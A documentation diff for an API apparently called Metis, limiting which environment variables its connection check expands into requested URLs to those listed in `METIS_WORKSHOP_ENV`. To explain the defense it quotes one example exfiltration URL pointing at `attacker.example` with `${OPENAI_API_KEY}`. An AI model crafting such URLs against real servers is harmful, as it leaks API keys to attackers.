@@ -442,9 +442,12 @@ The API reads the `HOST` variable to know its address. Start the API with `metis
 listens on that same address. If you start Uvicorn directly with a `--host` option, also set
 `HOST` to that address, or the live check can be on for a server that other computers can reach.
 
-The API never puts a value from its own environment into a URL that it requests. Otherwise a
-client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
-`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
+The API puts a value from its own environment into a URL that it requests only for a variable
+that `METIS_WORKSHOP_ENV` names. Each user account can already read those values. See
+[Turn on login for a shared server](#turn-on-login-for-a-shared-server). The API expands no
+other variable. Otherwise a client could send
+`https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A `spec_url` or
+`start_url` that names any other `${NAME}` variable is not requested: its probe says so, and
 `status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
 the variables.
 
@@ -616,8 +619,9 @@ METIS_WORKSHOP_ENV=LANGFUSE_PUBLIC_KEY,LANGFUSE_SECRET_KEY,LANGFUSE_BASE_URL
 The API reads their values at startup, also from `.env`. `GET /api/v1/workshop/env` returns each
 variable that has a value, in the same order, and the web app shows them as `.env` lines under
 **CLI settings** in the account menu. Without `METIS_WORKSHOP_ENV`, the route returns 404
-`not_found`. Each user account with a login session can read these values. List only values for
-participants. Never list a model provider key or a `METIS_` variable.
+`not_found`. The live connection check also puts these values into a `spec_url` or `start_url`
+that names them, such as `${TOYAPP_API_URL}/openapi.json` for the demo Target. Each user account
+with a login session can read these values. List only values for participants. Never list a model provider key or a `METIS_` variable.
 
 The API does not start when one of these variables is set and `METIS_LOGIN` is not `1`, when the
 two tokens are the same, when only one of the two admin variables is set, or when
